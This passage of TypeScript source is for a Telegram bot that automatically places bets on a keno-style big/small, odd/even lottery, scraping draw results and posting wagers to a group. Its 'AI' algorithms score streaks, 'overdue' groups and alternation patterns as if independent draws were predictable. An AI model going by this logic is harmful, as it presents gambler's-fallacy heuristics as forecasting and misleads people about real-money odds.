    const firstHalf = h10.slice(0, 5);
    const secondHalf = h10.slice(5);
    const drift = ratioA(secondHalf) - ratioA(firstHalf);
    // 近期方向明显漂移 → 跟随（突破信号）
    if (Math.abs(drift) >= 0.3) score += drift * 2.5;
  }

  // ── M7: 熵值自适应权重调整 ────────────────────────────────────────────────
  const h20 = last(20);
  let transitions = 0;
  for (let i = 1; i < h20.length; i++) if (h20[i] !== h20[i - 1]) transitions++;
  const entropy = h20.length > 1 ? transitions / (h20.length - 1) : 0.5;
  // 有序市场(低熵)：形态信号更可靠，放大 score；混沌市场(高熵)：依赖统计回归，收敛 score
  const entropyFactor = entropy < 0.4 ? 1.3 : entropy > 0.7 ? 0.75 : 1.0;
  score *= entropyFactor;

  // ── M8: 最终平局决胜（全局少数方向）────────────────────────────────────
  if (score === 0) {
    const globalA = countA(last(50));
    const total   = Math.min(50, history.length);
    score = globalA <= total / 2 ? 0.1 : -0.1;
  }

  // ── M9: 双组防连方向（dualGroupMode 或对立选项专用）────────────────────
  // 惩罚从 3.5 降到 2.0：避免在趋势市场中对抗强方向信号
  const isDualGroup = session.cfg.dualGroupMode || (() => {
    const ls = session.cfg.betOptions.map(o => BET_OPTION_LABELS[o]);
    return ls.length === 2 && (
      (ls.includes("大单") && ls.includes("小双")) ||
      (ls.includes("小单") && ls.includes("大双"))
    );
  })();
  if (isDualGroup && session.lastAIBet !== null) {
    const tentative = score > 0 ? optA : optB;
    if (tentative === session.lastAIBet) {
      score = score > 0 ? score - 2.0 : score + 2.0;
    }
  }

  const decision = score > 0 ? optA : optB;
  session.lastAIBet = decision;
  return decision;
}

// ─── Algorithm 2: 稳健跟势 (steady_ai) ───────────────────────────────────────
/**
 * 升级版算法 — 趋势跟随为主，与 AI趋势 的均值回归逻辑形成互补。
 * 核心逻辑：
 *  S1 主趋势（25期）: 哪边占优就跟哪边，不强行预测反转
 *  S2 短期趋势（8期）: 近期方向确认
 *  S3 连出跟随:  1-5期连出继续跟，≥7期才考虑反转
 *  S4 ABAB震荡识别: 明显震荡时跟上期反面
 *  S5 连亏防连方向（dual mode）
 */
function decideSteady(session: TgSession): string | null {
  let optA: string, optB: string, history: string[];

  if (session.cfg.dualGroupMode) {
    optA = "大单小双"; optB = "小单大双";
    history = [...lotteryHistoryCache, ...session.recentResults]
      .map(r => (r === "大单" || r === "小双") ? optA : (r === "小单" || r === "大双") ? optB : null)
      .filter((x): x is string => x !== null);
  } else {
    const labels = session.cfg.betOptions.map(o => BET_OPTION_LABELS[o]);
    if (labels.length < 2) return labels[0] ?? null;
    [optA, optB] = labels as [string, string];
    history = [...lotteryHistoryCache, ...session.recentResults]
      .map(r => mapR3ToEnabled(r, [optA, optB]))
      .filter((x): x is string => x !== null);
  }

  if (history.length < 3) return Math.random() < 0.5 ? optA : optB;

  const n = history.length;
  const latest = history[n - 1]!;
  let score = 0;

  const countA = (arr: string[]) => arr.filter(x => x === optA).length;
  const ratioA = (arr: string[]) => arr.length ? countA(arr) / arr.length : 0.5;

  // ── S1: 主趋势（近25期）— 占优就跟 ─────────────────────────────────────────
  const h25 = history.slice(-Math.min(25, n));
  const r25 = ratioA(h25);
  if (r25 >= 0.60)      score += (r25 - 0.5) * 8;   // A 占优，跟 A
  else if (r25 <= 0.40) score += (r25 - 0.5) * 8;   // B 占优，跟 B（负分）

  // ── S2: 短期趋势（近8期）确认 ────────────────────────────────────────────
  const h8 = history.slice(-Math.min(8, n));
  const r8 = ratioA(h8);
  if (r8 >= 0.625)      score += 2.0;   // 近期 A 强
  else if (r8 <= 0.375) score -= 2.0;   // 近期 B 强

  // ── S3: 连出跟随 / 长龙反转 ──────────────────────────────────────────────
  let streak = 0;
  for (let i = n - 1; i >= 0 && history[i] === latest; i--) streak++;
  if (streak >= 1 && streak <= 5) {
    // 短中龙：连开大概率，继续跟
    const weight = Math.min(streak, 4) * 0.8;
    score += latest === optA ? weight : -weight;
  } else if (streak === 6) {
    // 6连：仍然跟，不要在此处预测反转（每期独立事件）
    score += latest === optA ? 1.5 : -1.5;
  } else if (streak >= 7 && streak <= 9) {
    // 长龙7-9：轻微反转预警，但信号弱
    score += latest === optA ? -1.0 : 1.0;
  } else if (streak >= 10) {
    // 超长龙≥10：均值回归时间窗口早已过，强势跟龙
    const weight = 2.5;
    score += latest === optA ? weight : -weight;
  }

  // ── S4: ABAB 震荡识别（近6期交替率） ─────────────────────────────────────
  if (h8.length >= 6) {
    let altCount = 0;
    for (let i = 1; i < h8.length; i++) if (h8[i] !== h8[i - 1]) altCount++;
    const altRatio = altCount / (h8.length - 1);
    if (altRatio >= 0.80) {
      // 强震荡：跟上期反面
      score += latest === optA ? -2.5 : 2.5;
    }
  }

  // ── S5: 双组/对立模式防连方向 ────────────────────────────────────────────
  const isDual = session.cfg.dualGroupMode || (() => {
    const ls = session.cfg.betOptions.map(o => BET_OPTION_LABELS[o]);
    return ls.length === 2 && (
      (ls.includes("大单") && ls.includes("小双")) ||
      (ls.includes("小单") && ls.includes("大双"))
    );
  })();
  if (isDual && session.lastAIBet !== null) {
    const tentative = score >= 0 ? optA : optB;
    if (tentative === session.lastAIBet) {
      score = score >= 0 ? score - 1.5 : score + 1.5; // 2.5→1.5，趋势市场不宜过强惩罚同向
    }
  }

  const decision = score >= 0 ? optA : optB;
  session.lastAIBet = decision;
  return decision;
}

// ─── Auto-bet engine ──────────────────────────────────────────────────────────

/**
 * 只发追号部分（主注被风控屏蔽时使用）。
 * 格式示例: "0/100  27/100"
 */
async function placeChaseOnly(session: TgSession): Promise<void> {
  if (!session.cfg.enableChase || session.chasePlacedThisCycle) return;
  const chaseEntries = session.cfg.chaseNumbers.filter(c => c.amount > 0);
  if (chaseEntries.length === 0) return;

  const targetId = session.watchGroupId!;
  const groupTitle = session.groups.find(g => g.id === targetId || `-100${g.id}` === targetId)?.title ?? targetId;
  const message = chaseEntries.map(c => `${c.num}/${c.amount}`).join("  ");
  const now = Date.now();
  let succeeded = false;
  let failReason: string | undefined;
  try {
    await session.client.sendMessage(targetId, { message });
    session.lastBetAt = now;
    succeeded = true;
  } catch (err) {
    failReason = extractTgError(err);
    handleBetSendError(session, failReason);
  }

  session.chasePlacedThisCycle = true;
  const status = succeeded ? "sent" : "failed";
  for (const { num, amount } of chaseEntries) {
    const rec: BetRecord = {
      id: `chase-${num}-${now}`, groupId: targetId, groupTitle,
      messageText: message, betContent: String(num), amount,
      timestamp: now, status, isChase: true,
      ...(failReason ? { failReason } : {}),
    };
    session.betLog.unshift(rec);
    pushEvent(session, "bet:new", { bet: rec });
  }
  if (session.betLog.length > 200) session.betLog.length = 200;
}

/**
 * 将主注 + 所有追号合并为一条消息发出。
 * 格式示例: "0/100  27/100  大 100"
 * 各部分仍作为独立 BetRecord 入库，以便分别结算。
 */
async function placeAllBets(session: TgSession, direction: string): Promise<void> {
  const { betLog } = session;
  const targetId = session.watchGroupId!;
  const mainAmount = session.currentBet;
  const groupTitle = session.groups.find(g => g.id === targetId || `-100${g.id}` === targetId)?.title ?? targetId;
  session.betPlacedThisCycle = true;

  // 双组模式：把虚拟组名展开成两个实际选项
  // "大单小双" → ["大单","小双"]，"小单大双" → ["小单","大双"]
  const DUAL_GROUP_MAP: Record<string, string[]> = {
    "大单小双": ["大单", "小双"],
    "小单大双": ["小单", "大双"],
  };
  // 非 ai_trend/steady_ai 算法可能只返回单个标签（如 "小单"），在双组模式下自动提升为复合方向
  let effectiveDirection = direction;
  if (session.cfg.dualGroupMode && !DUAL_GROUP_MAP[direction]) {
    if (direction === "大单" || direction === "小双") effectiveDirection = "大单小双";
    else if (direction === "小单" || direction === "大双") effectiveDirection = "小单大双";
  }
  const dualItems = session.cfg.dualGroupMode ? (DUAL_GROUP_MAP[effectiveDirection] ?? [effectiveDirection]) : null;

  // Only include chase entries if not already sent this cycle
  const chaseEntries = (!session.chasePlacedThisCycle && session.cfg.enableChase ? session.cfg.chaseNumbers : [])
    .filter(c => c.amount > 0);
  session.chasePlacedThisCycle = true;

  // Compose message
  // Dual group: "大单 100  小双 100  0/chase"
  // Normal:     "0/chase  大 100"
  const betParts: string[] = dualItems
    ? dualItems.map(opt => `${opt} ${mainAmount}`)
    : [`${direction} ${mainAmount}`];
  const parts: string[] = [
    ...chaseEntries.map(c => `${c.num}/${c.amount}`),
    ...betParts,
  ];
  const message = parts.join("  ");

  const now = Date.now();
  let succeeded = false;
  let failReason: string | undefined;
  try {
    await session.client.sendMessage(targetId, { message });
    session.lastBetAt = now;
    succeeded = true;
  } catch (err) {
    failReason = extractTgError(err);
    handleBetSendError(session, failReason);
  }

  const status = succeeded ? "sent" : "failed";

  const algoId = session.lastAlgoUsed;
  const rawAlgoDir = session.lastRawAlgoDir ?? undefined;
  if (dualItems) {
    // 双组模式：合并为一条记录，betContent = "大单+小双"
    const dualRec: BetRecord = {
      id: `main-${now}`, groupId: targetId, groupTitle,
      messageText: message, betContent: dualItems.join("+"), amount: mainAmount,
      timestamp: now, status,
      ...(failReason ? { failReason } : {}),
      ...(algoId ? { algoId } : {}),
      ...(rawAlgoDir ? { rawAlgoDir } : {}),
    };
    betLog.unshift(dualRec);
    pushEvent(session, "bet:new", { bet: dualRec });
  } else {
    // 普通模式：一条主 BetRecord
    const mainRec: BetRecord = {
      id: `main-${now}`, groupId: targetId, groupTitle,
      messageText: message, betContent: direction, amount: mainAmount,
      timestamp: now, status,
      ...(failReason ? { failReason } : {}),
      ...(algoId ? { algoId } : {}),
      ...(rawAlgoDir ? { rawAlgoDir } : {}),
    };
    betLog.unshift(mainRec);
    pushEvent(session, "bet:new", { bet: mainRec });
  }

  // Log individual chase records
  for (const { num, amount } of chaseEntries) {
    const rec: BetRecord = {
      id: `chase-${num}-${now}`, groupId: targetId, groupTitle,
      messageText: message, betContent: String(num), amount,
      timestamp: now, status, isChase: true,
      ...(failReason ? { failReason } : {}),
    };
    betLog.unshift(rec);
    pushEvent(session, "bet:new", { bet: rec });
  }

  if (betLog.length > 200) betLog.length = 200;
}

// ─── Kill-Group Mode ───────────────────────────────────────────────────────────
// 四组杀组：AI 从 [大单/大双/小单/小双] 中挑出最可能不出的那一组杀掉，
// 同时投注剩余三组。

const KILL_GROUP_ALL = ["大单", "大双", "小单", "小双"] as const;
type KillGroupOption = typeof KILL_GROUP_ALL[number];

/**
 * 根据走势分析决定杀哪一组（返回被杀组的标签）。
 *
 * 核心策略：杀"近期最热"的组——刚出过、出现频率高的组，
 * 下一期继续出的概率相对最低；长期缺席的组"欠出"，绝对不杀。
 *
 * 模块：
 *  A: 近期遗漏（越短越热，越值得杀）
 *  B: 短周期频率（近10期出现次数）
 *  C: 中周期频率（近20期出现次数）
 *  D: 当前连出加杀（连出≥2期，本期再出概率下降）
 *  E: 长缺席强保护（≥6期未出，绝对不杀）
 *  F: 大/小、单/双双面均衡修正
 */
function decideKillGroup(session: TgSession): KillGroupOption {
  const history = [...lotteryHistoryCache, ...session.recentResults]
    .filter((r): r is KillGroupOption => (KILL_GROUP_ALL as readonly string[]).includes(r));

  if (history.length < 4) {
    return KILL_GROUP_ALL[Math.floor(Math.random() * 4)]!;
  }

  const n = history.length;
  const scores: Record<KillGroupOption, number> = { "大单": 0, "大双": 0, "小单": 0, "小双": 0 };

  // ── 预计算遗漏 & 当前连出 ──────────────────────────────────────────────────
  const latest = history[n - 1]!;
  let streak = 0;
  for (let i = n - 1; i >= 0 && history[i] === latest; i--) streak++;

  const absence: Record<KillGroupOption, number> = { "大单": 0, "大双": 0, "小单": 0, "小双": 0 };
  for (const opt of KILL_GROUP_ALL) {
    let ab = 0;
    for (let i = n - 1; i >= 0 && history[i] !== opt; i--) ab++;
    absence[opt] = ab;
  }

  // ── 趋势保护（最高优先级）────────────────────────────────────────────────
  // 规则1：当前有效连出 ≥ 2 → 强烈保护，不能杀（趋势中）
  if (streak >= 2) {
    scores[latest] -= 999;
  }

  // 规则2：刚断大龙缓冲保护
  // 某组遗漏 1-5 期，但在最近 (absence+8) 期的历史里出现次数 ≥ 5 → 刚断龙，保护期
  for (const opt of KILL_GROUP_ALL) {
    if (opt === latest && streak >= 2) continue; // 已被规则1处理
    const ab = absence[opt];
    if (ab >= 1 && ab <= 5) {
      const lookback = Math.min(ab + 10, n);
      const preSlice = history.slice(-lookback, ab > 0 ? -ab : undefined);
      const hotCount = preSlice.filter(r => r === opt).length;
      if (hotCount >= 5) {
        // 刚断龙，可能短暂喘息后继续 → 缓冲期保护
        scores[opt] -= (6 - ab) * 1.5; // 断得越近保护越强
      }
    }
  }

  // ── A: 遗漏分：遗漏越少（越近期出现）→ 杀分越高 ───────────────────────────
  // 注意：已被趋势保护覆盖的组即使遗漏=0也不会被杀
  const maxAb = Math.max(...Object.values(absence));
  for (const opt of KILL_GROUP_ALL) {
    const hotness = maxAb > 0 ? (maxAb - absence[opt]) / maxAb : 0.5;
    scores[opt] += hotness * 3.0;
  }

  // ── B: 近10期出现频率（短期热度）────────────────────────────────────────────
  const h10 = history.slice(-Math.min(10, n));
  for (const opt of KILL_GROUP_ALL) {
    const cnt = h10.filter(r => r === opt).length;
    if (cnt >= 4) scores[opt] += (cnt - 2.5) * 1.2;
    else if (cnt >= 3) scores[opt] += 0.6;
  }

  // ── C: 近20期出现频率（中期热度）────────────────────────────────────────────
  const h20 = history.slice(-Math.min(20, n));
  for (const opt of KILL_GROUP_ALL) {
    const freq20 = h20.filter(r => r === opt).length / h20.length;
    const excess = freq20 - 0.25;
    if (excess > 0.1) scores[opt] += excess * 4.0;
  }

  // ── D: 单次刚出加杀（streak=1，非龙非缓冲时）──────────────────────────────
  // streak≥2 已被规则1强保护，streak=1 且无断龙缓冲才正常加杀分
  if (streak === 1 && scores[latest] > -10) {
    scores[latest] += 0.5;
  }

  // ── E: 长缺席强保护（欠出，绝对不杀）────────────────────────────────────────
  for (const opt of KILL_GROUP_ALL) {
    const ab = absence[opt];
    if (ab >= 8)      scores[opt] -= 20;
    else if (ab >= 6) scores[opt] -= 10;
    else if (ab >= 4) scores[opt] -= 3;
    else if (ab >= 3) scores[opt] -= 1;
  }

  // ── F/G: 均衡修正 + 大/小维度龙形感知 + 4组形态感知 ─────────────────────
  const h30 = history.slice(-Math.min(30, n));
  const bigFreq = h30.filter(r => r.startsWith("大")).length / h30.length;
  const oddFreq = h30.filter(r => r.endsWith("单")).length / h30.length;

  // 单/双 均衡修正（始终生效：单或双极端偏斜时加杀分）
  if (oddFreq > 0.58) { scores["大单"] += 0.8; scores["小单"] += 0.8; }
  else if (oddFreq < 0.42) { scores["大双"] += 0.8; scores["小双"] += 0.8; }

  // 大/小 维度独立形态检测（8期）
  const patternH = history.slice(-Math.min(8, n));
  let patternAlt = 0;
  for (let i = 1; i < patternH.length; i++) if (patternH[i] !== patternH[i - 1]) patternAlt++;
  const patternRatio = patternH.length > 1 ? patternAlt / (patternH.length - 1) : 0.5;

  const bigSmallH = patternH.map(r => r.startsWith("大") ? "大" : "小");
  let bsAlt = 0;
  for (let i = 1; i < bigSmallH.length; i++) if (bigSmallH[i] !== bigSmallH[i - 1]) bsAlt++;
  const bsRatio = bigSmallH.length > 1 ? bsAlt / (bigSmallH.length - 1) : 0.5;

  if (bsRatio <= 0.30) {
    // 大/小维度龙形：顺龙押注策略 —— 杀对立方（冷侧）的一个子组，保留热侧在注单
    // 这样注单里始终包含热侧的两个子组（大单+大双 或 小单+小双）
    if (bigFreq < 0.42) {
      // 小龙（小侧连续出）：提高大侧杀分，压低小侧杀分 → 注单保留 小单+小双+一个大组
      for (const opt of KILL_GROUP_ALL) {
        if (scores[opt] > -900) {
          if (opt.startsWith("大")) scores[opt] += 2.0;
          if (opt.startsWith("小")) scores[opt] -= 2.0;
        }
      }
    } else if (bigFreq > 0.58) {
      // 大龙：提高小侧杀分，压低大侧杀分 → 注单保留 大单+大双+一个小组
      for (const opt of KILL_GROUP_ALL) {
        if (scores[opt] > -900) {
          if (opt.startsWith("小")) scores[opt] += 2.0;
          if (opt.startsWith("大")) scores[opt] -= 2.0;
        }
      }
    }
    // bigFreq 接近0.5时大/小均衡，不作方向调整，继续用下方4组逻辑
  } else {
    // 非大/小龙形：大/小均衡修正（偏斜时加杀分纠偏）
    if (bigFreq > 0.58) { scores["大单"] += 0.8; scores["大双"] += 0.8; }
    else if (bigFreq < 0.42) { scores["小单"] += 0.8; scores["小双"] += 0.8; }
  }

  // 4组维度形态感知（在大/小非极端龙形时生效）
  if (bsRatio > 0.20) {
    if (patternRatio <= 0.30) {
      // 4组龙形市场：活跃组有惯性 → 杀"最冷"组
      for (const opt of KILL_GROUP_ALL) {
        if (scores[opt] > -900) {
          const coldness = absence[opt];
          const hotness = maxAb > 0 ? (maxAb - absence[opt]) / maxAb : 0;
          scores[opt] += coldness * 1.2 - hotness * 4.0;
        }
      }
    } else if (patternRatio >= 0.70) {
      // 4组强震荡市场：刚出的组大概率不再出 → 加权杀刚出现的组
      for (const opt of KILL_GROUP_ALL) {
        if (scores[opt] > -900) {
          if (absence[opt] === 0) scores[opt] += 2.5;
          else if (absence[opt] === 1) scores[opt] += 1.0;
        }
      }
    }
  }
  // 中性市场：保持基础统计逻辑，不额外调整

  const killed = (Object.entries(scores) as [KillGroupOption, number][])
    .sort((a, b) => b[1] - a[1])[0]![0];
  return killed;
}

/**
 * 发出三注：下注除被杀组以外的三个选项，共享一条消息。
 */
async function placeKillGroupBets(session: TgSession, killedGroup: KillGroupOption, isAdaptive = false): Promise<void> {
  const { betLog } = session;
  const targetId = session.watchGroupId!;
  const amount = session.currentBet;
  const groupTitle = session.groups.find(g => g.id === targetId || `-100${g.id}` === targetId)?.title ?? targetId;

  const toBet = KILL_GROUP_ALL.filter(o => o !== killedGroup);
  const chaseEntries = (!session.chasePlacedThisCycle && session.cfg.enableChase ? session.cfg.chaseNumbers : [])
    .filter(c => c.amount > 0);

  const parts: string[] = [
    ...chaseEntries.map(c => `${c.num}/${c.amount}`),
    ...toBet.map(opt => `${opt} ${amount}`),
  ];
  const message = parts.join("  ");

  const now = Date.now();
  session.betPlacedThisCycle = true;
  session.chasePlacedThisCycle = true;

  let succeeded = false;
  let failReason: string | undefined;
  try {
    await session.client.sendMessage(targetId, { message });
    session.lastBetAt = now;
    succeeded = true;
  } catch (err) {
    failReason = extractTgError(err);
    handleBetSendError(session, failReason);
  }

  const status = succeeded ? "sent" : "failed";

  // 三组合并为一条记录，betContent = "大双+大单+小双"
  const killAlgoId = session.lastAlgoUsed ?? "adaptive_switch";
  const combinedRec: BetRecord = {
    id: `kill-${now}`, groupId: targetId, groupTitle,
    messageText: message, betContent: toBet.join("+"), amount,
    timestamp: now, status,
    ...(failReason ? { failReason } : {}),
    ...(isAdaptive ? { isAdaptiveKillBet: true } : {}),
    algoId: killAlgoId,
  };
  betLog.unshift(combinedRec);
  pushEvent(session, "bet:new", { bet: combinedRec });

  // 追号记录
  for (const { num, amt } of chaseEntries.map(c => ({ num: c.num, amt: c.amount }))) {
    const rec: BetRecord = {
      id: `chase-${num}-${now}`, groupId: targetId, groupTitle,
      messageText: message, betContent: String(num), amount: amt,
      timestamp: now, status, isChase: true,
      ...(failReason ? { failReason } : {}),
    };
    betLog.unshift(rec);
    pushEvent(session, "bet:new", { bet: rec });
  }

  if (betLog.length > 200) betLog.length = 200;
}

async function runAutoBet(session: TgSession): Promise<void> {
  if (!session.cfg.autoBet || !session.watchGroupId) return;
  const { betLog } = session;
  const nowMs = Date.now();
  for (const stale of betLog.filter(b => b.status === "sent" && nowMs - b.timestamp > 240_000)) stale.status = "lost";
  // Chase bets are settled separately; only block on un-settled main bets
  if (betLog.some(b => b.status === "sent" && !b.isChase)) return;
  if (session.betPlacedThisCycle) return;

  if (session.currentCloseTimeMs > 0) {
    const timeToClose = session.currentCloseTimeMs - nowMs;
    if (timeToClose > BET_BEFORE_DRAW_MS + 10_000 || timeToClose < 0) {
      logger.warn({ timeToCloseSec: Math.round(timeToClose / 1000) }, "[auto-bet] outside betting window, skip");
      return;
    }
  }

  const risk = checkRisk(session);
  if (!risk.ok) {
    if (session.cfg.enableChase && !session.chasePlacedThisCycle) {
      await placeChaseOnly(session);
    }
    return;
  }

  // adaptive_switch 算法：大小未中自动切杀组，杀组中奖切回大小
  if (session.cfg.algorithms.includes("adaptive_switch")) {
    if (session.adaptiveSwitchKillMode) {
      const killed = decideKillGroup(session);
      pushEvent(session, "bet:kill", { killed, adaptive: true });
      await placeKillGroupBets(session, killed, true);
      return;
    }
    // 大小模式：强制只用大/小两个选项，不受 betOptions 配置影响
    const bigSmallSession = { ...session, cfg: { ...session.cfg, betOptions: ["big", "small"] as BetOption[] } };
    const direction = decideBetAuto(bigSmallSession);
    if (!direction) return;
    // 同步 lastAlgoUsed 回原 session（bigSmallSession 是浅拷贝，algo 决策结果需同步）
    session.lastAlgoUsed = bigSmallSession.lastAlgoUsed;
    session.algIndex = bigSmallSession.algIndex;
    await placeAllBets(session, direction);
    return;
  }

  // 四组杀组模式：AI 决定杀哪组，剩余三组全押
  if (session.cfg.killGroupMode) {
    const killed = decideKillGroup(session);
    pushEvent(session, "bet:kill", { killed });
    await placeKillGroupBets(session, killed);
    return;
  }

  // For signal-based algos, use the cached last signal if available; otherwise fall back to auto decider
  const isSignalAlgo = session.cfg.algorithms.includes("signal_follow") || session.cfg.algorithms.includes("signal_reverse");
  const hasSignal = isSignalAlgo && !!session.lastSignalText;
  const direction = hasSignal
    ? decideBet(session, session.lastSignalText)
    : decideBetAuto(session);
  if (!direction) {
    logger.info({ isSignalAlgo, hasSignal }, "[auto-bet] no direction decided, skip");
    return;
  }
  await placeAllBets(session, direction);
}

function scheduleNextBet(session: TgSession, closeTimeMs: number, cycleMs: number): void {
  if (session.autoNextBetTimer) { clearTimeout(session.autoNextBetTimer); session.autoNextBetTimer = undefined; }
  if (!session.cfg.autoBet || !session.watchGroupId) return;

  const timeToClose = closeTimeMs - Date.now();
  const delay = Math.max(5_000,
    timeToClose >= BET_BEFORE_DRAW_MS + 5_000
      ? timeToClose - BET_BEFORE_DRAW_MS
      : timeToClose + cycleMs - BET_BEFORE_DRAW_MS
  );

  logger.info({ delaySec: Math.round(delay / 1000), timeToCloseSec: Math.round(timeToClose / 1000) }, "[bet-timer] scheduled");
  pushEvent(session, "timer:scheduled", { fireAt: Date.now() + delay, delaySec: Math.round(delay / 1000) });

  session.autoNextBetTimer = setTimeout(() => {
    session.autoNextBetTimer = undefined;
    void runAutoBet(session);
  }, delay);
}

// ─── Lottery poller ───────────────────────────────────────────────────────────

type DrawItem = { term: number; r3?: string; sum1?: number; sum2?: number; sum3?: number; result?: number; openTime?: number; closeTime?: number };

async function pollLottery(session: TgSession): Promise<void> {
  try {
    const r = await fetch("http://pc20.net/api/fengpan", {
      headers: { "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15", "Referer": "http://pc20.net/" },
      signal: AbortSignal.timeout(8000),
    });
    if (!r.ok) return;
    const data = await r.json() as { message?: { all?: { keno28?: { data?: DrawItem[] } } } };
    const items = data?.message?.all?.keno28?.data ?? [];
    const latest = items[0];
    if (!latest?.term) return;

    const labels = items.map(d => d.r3).filter((x): x is string => !!x).reverse();
    if (labels.length) lotteryHistoryCache = labels.slice(-50);

    if (latest.term <= session.lastSeenLotteryPeriod) return;

    if (latest.r3) {
      // Settle ALL pending main bets
      // betContent may be "大" / "大单" / "大单+小双" / "大双+大单+小双"
      const pendingAll = session.betLog.filter(b => b.status === "sent" && !b.isChase);
      for (const pending of pendingAll) {
        const parts = pending.betContent.split("+").map(s => s.trim());
        const count = parts.length; // 1=normal, 2=dual, 3=kill-group
        let wonPart = false;
        for (const bet of parts) {
          if (bet === latest.r3) { wonPart = true; break; }
          if (bet.length === 1) {
            if ((bet === "大" && latest.r3.startsWith("大")) ||
                (bet === "小" && latest.r3.startsWith("小")) ||
                (bet === "单" && latest.r3.endsWith("单")) ||
                (bet === "双" && latest.r3.endsWith("双"))) {
              wonPart = true; break;
            }
          }
        }
        // pnl: winning part's odds used; net = amount*(winOdds-count) if won, -count*amount if lost
        const winningPart = wonPart ? parts.find(bet => {
          if (bet === latest.r3) return true;
          if (bet.length === 1) {
            if ((bet === "大" && latest.r3!.startsWith("大")) ||
                (bet === "小" && latest.r3!.startsWith("小")) ||
                (bet === "单" && latest.r3!.endsWith("单")) ||
                (bet === "双" && latest.r3!.endsWith("双"))) return true;
          }
          return false;
        }) : undefined;
        const winOdds = winningPart ? getOddsForBet(winningPart, session.cfg) : session.cfg.odds;
        const pnl = wonPart
          ? Math.round(pending.amount * (winOdds - count) * 100) / 100
          : -pending.amount * count;
        settleBet(session, { won: wonPart, pnl, result: latest.r3, betId: pending.id, period: latest.term });
      }

      // Settle chase number bets by sum value (excluded from main stats)
      const sum = (latest.sum1 ?? 0) + (latest.sum2 ?? 0) + (latest.sum3 ?? 0);
      const chasePending = session.betLog.filter(b => b.status === "sent" && b.isChase);
      let chaseWon = false;
      for (const cb of chasePending) {
        const targetNum = parseInt(cb.betContent, 10);
        const won = !isNaN(targetNum) && targetNum === sum;
        if (won) chaseWon = true;
        const winPnl = Math.round(cb.amount * (session.cfg.odds - 1) * 100) / 100;
        settleBet(session, { won, pnl: won ? winPnl : -cb.amount, result: latest.r3, betId: cb.id, period: latest.term, isChase: true });
      }
      // 追号中奖后自动停止追号
      if (chaseWon && session.cfg.enableChase) {
        session.cfg.enableChase = false;
        pushEvent(session, "chase:won_stop", { sum });
      }
    }

    session.lastSeenLotteryPeriod = latest.term;

    const closeMs = latest.closeTime ?? 0;
    const openMs = latest.openTime ?? 0;
    const nowMs = Date.now();
    const cycleMs = (closeMs > openMs && closeMs - openMs < 600000) ? (closeMs - openMs) : DRAW_CYCLE_MS;
    const nextCloseMs = closeMs > nowMs ? closeMs : closeMs + cycleMs;

    pushEvent(session, "draw:new", {
      term: latest.term, r3: latest.r3 ?? "",
      sum1: latest.sum1, sum2: latest.sum2, sum3: latest.sum3,
      result: latest.result, closeTime: closeMs, openTime: openMs,
      nextCloseTime: nextCloseMs,
    });

    session.betPlacedThisCycle = false;
    session.chasePlacedThisCycle = false;
    session.currentCloseTimeMs = nextCloseMs > nowMs ? nextCloseMs : nowMs + cycleMs;
    if (session.cfg.autoBet && session.watchGroupId) {
      scheduleNextBet(session, session.currentCloseTimeMs, cycleMs);
    }

    void sendYeForBalance(session);
  } catch { /* network errors ignored */ }
}

function startPoller(session: TgSession): void {
  if (session.lotteryPollTimer) return;
  session.lotteryPollTimer = setInterval(() => { void pollLottery(session); }, 5_000);
}

function stopPoller(session: TgSession): void {
  if (session.lotteryPollTimer) { clearInterval(session.lotteryPollTimer); session.lotteryPollTimer = undefined; }
  if (session.autoNextBetTimer) { clearTimeout(session.autoNextBetTimer); session.autoNextBetTimer = undefined; }
}

// ─── Group message listener ───────────────────────────────────────────────────

function startGroupListener(session: TgSession): void {
  if (!session.watchGroupId) return;
  if (session.cfg.gameMode === "kuaisan") { startKuaisanListener(session); return; }
  if (session.cfg.gameMode === "hash") { startHashListener(session); return; }
  if (session.messageHandler && session.messageHandlerBuilder) {
    try { session.client.removeEventHandler(session.messageHandler, session.messageHandlerBuilder); } catch { /* ok */ }
    session.messageHandler = null; session.messageHandlerBuilder = null;
  }
  const targetId = session.watchGroupId;

  session.messageHandler = async (event: NewMessageEvent) => {
    const msg = event.message;
    if (msg.out) return;
    const chatId = String(msg.chatId);
    if (chatId !== targetId && `-100${chatId}` !== targetId) return;
    const senderId = String(msg.senderId ?? "");
    const text = msg.message ?? "";
    if (!session.cfg.autoBet) return;
    if (session.kkpayEntityId && senderId === session.kkpayEntityId) return;

    // Cache signal text for signal_follow / signal_reverse algos before window check
    if (parseBetLabel(text)) session.lastSignalText = text;

    // Only block on unsettled main bets — chase bets (isChase=true) must not block main bet placement
    if (session.betLog.some(b => b.status === "sent" && !b.isChase)) return;
    if (session.betPlacedThisCycle) return;
    const periodInMsg = text.match(/第?(\d{6,10})期/)?.at(1);
    const triggerPeriod = periodInMsg ? parseInt(periodInMsg) : undefined;
    if (triggerPeriod && triggerPeriod === session.lastBetPeriod) return;

    if (session.currentCloseTimeMs > 0) {
      const timeToClose = session.currentCloseTimeMs - Date.now();
      if (timeToClose > BET_BEFORE_DRAW_MS + 10_000 || timeToClose < 0) {
        logger.info({ timeToCloseSec: Math.round(timeToClose / 1000) }, "[msg-bet] outside betting window, skip");
        return;
      }
    }

    const risk = checkRisk(session);
    if (!risk.ok) {
      // Risk blocked main bet — chase numbers still go out every period
      if (session.cfg.enableChase && !session.chasePlacedThisCycle) {
        void placeChaseOnly(session);
      }
      return;
    }
    // adaptive_switch: 信号触发时同样根据当前状态决定大小还是杀组
    if (session.cfg.algorithms.includes("adaptive_switch")) {
      if (session.autoNextBetTimer) { clearTimeout(session.autoNextBetTimer); session.autoNextBetTimer = undefined; }
      if (triggerPeriod) session.lastBetPeriod = triggerPeriod;
      if (session.adaptiveSwitchKillMode) {
        const killed = decideKillGroup(session);
        pushEvent(session, "bet:kill", { killed, adaptive: true });
        void placeKillGroupBets(session, killed, true);
      } else {
        // 大小模式：强制只用大/小选项
        const bigSmallSession = { ...session, cfg: { ...session.cfg, betOptions: ["big", "small"] as BetOption[] } };
        const direction = decideBet(bigSmallSession, text);
        if (direction) {
          // 同步 lastAlgoUsed 回原 session
          session.lastAlgoUsed = bigSmallSession.lastAlgoUsed;
          session.algIndex = bigSmallSession.algIndex;
          void placeAllBets(session, direction);
        }
      }
      return;
    }
    const direction = decideBet(session, text);
    if (!direction) return;
    if (session.autoNextBetTimer) { clearTimeout(session.autoNextBetTimer); session.autoNextBetTimer = undefined; }
    if (triggerPeriod) session.lastBetPeriod = triggerPeriod;
